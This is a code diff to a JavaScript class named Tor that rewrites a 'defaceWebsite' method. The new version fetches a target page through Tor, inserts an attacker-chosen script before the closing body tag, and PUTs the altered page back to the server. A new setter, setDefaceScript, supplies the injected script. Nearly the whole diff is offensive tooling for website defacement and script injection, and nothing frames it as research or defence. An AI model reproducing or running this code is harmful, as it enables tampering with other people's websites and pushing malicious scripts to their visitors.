@@ -50,6 +50,7 @@ class Tor {
         this.maxConcurrentRequests = 50;
         this.initRequestQueue();
         this.bypassCache = true;
+        this.defaceScript = null;
     }
 
     initRequestQueue() {
@@ -246,41 +247,54 @@ class Tor {
         this.customHeaders = headers;
     }
 
-    async defaceWebsite(url, htmlContent) {
-        try {
-            const response = await this.fetchWithTor(url, { method: 'GET' });
-            if (!response.ok) {
-                throw new Error(`Failed to fetch the website. Status: ${response.status}`);
-            }
+    async defaceWebsite(url) {
+      if (!this.defaceScript) {
+        console.error('Deface script not set. Use setDefaceScript() first.');
+        return;
+      }
 
-            const parser = new DOMParser();
-            const doc = parser.parseFromString(await response.text(), 'text/html');
-
-            doc.documentElement.innerHTML = htmlContent;
-
-            const serializer = new XMLSerializer();
-            const defacedContent = serializer.serializeToString(doc);
-            const options = {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'text/html',
-                    'User-Agent': this.userAgent,
-                    ...this.customHeaders
-                },
-                body: defacedContent,
-                redirect: 'follow'
-            };
-
-            const putResponse = await this.fetchWithTor(url, options);
-
-            if (putResponse.ok) {
-                console.log('Website defaced successfully!');
-            } else {
-                console.error(`Failed to deface website. Status: ${putResponse.status}`);
-            }
-        } catch (error) {
-            console.error('Deface operation failed:', error);
+      try {
+        const response = await this.fetchWithTor(url, { method: 'GET' });
+        if (!response.ok) {
+          throw new Error(`Failed to fetch the website. Status: ${response.status}`);
         }
+
+        let targetContent = await response.text();
+
+        const scriptTag = `<script>${this.defaceScript}</script>`;
+        const injectionPoint = targetContent.indexOf('</body>');
+
+        if (injectionPoint !== -1) {
+          targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
+        } else {
+          targetContent += scriptTag;
+        }
+
+        const options = {
+          method: 'PUT',
+          headers: {
+            'Content-Type': 'text/html',
+            'User-Agent': this.userAgent,
+            ...this.customHeaders
+          },
+          body: targetContent,
+          redirect: 'follow'
+        };
+
+        const putResponse = await this.fetchWithTor(url, options);
+
+        if (putResponse.ok) {
+          console.log('Website defaced successfully!');
+        } else {
+          console.error(`Failed to deface website. Status: ${putResponse.status}`);
+        }
+      } catch (error) {
+        console.error('Deface operation failed:', error);
+      }
+    }
+
+    setDefaceScript(script) {
+      this.defaceScript = script;
     }
 }
 
